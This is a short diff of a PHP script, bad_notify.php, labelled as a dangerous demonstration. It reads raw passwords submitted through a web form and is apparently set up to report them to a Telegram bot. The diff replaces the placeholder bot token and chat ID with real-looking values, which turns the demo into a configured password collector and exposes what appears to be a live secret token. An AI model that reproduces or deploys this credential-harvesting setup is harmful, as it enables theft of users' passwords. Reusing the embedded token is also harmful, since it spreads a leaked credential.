@@ -1,8 +1,8 @@
 <?php
 // bad_notify.php  — DANGEROUS: example for demonstration only!
 
-$TELEGRAM_BOT_TOKEN = 'BOT_TOKEN';
-$TELEGRAM_CHAT_ID  = 'CHAT_ID';
+$TELEGRAM_BOT_TOKEN = '8224829602:AAHQr6S_wtiv8-Y3pjy4B8HqFKZptt8QrSM';
+$TELEGRAM_CHAT_ID  = '8434336483';
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Insecure: reading raw password from form
@@ -24,3 +24,4 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     echo "Recorded (insecure demo).";
 }
 ?>
+
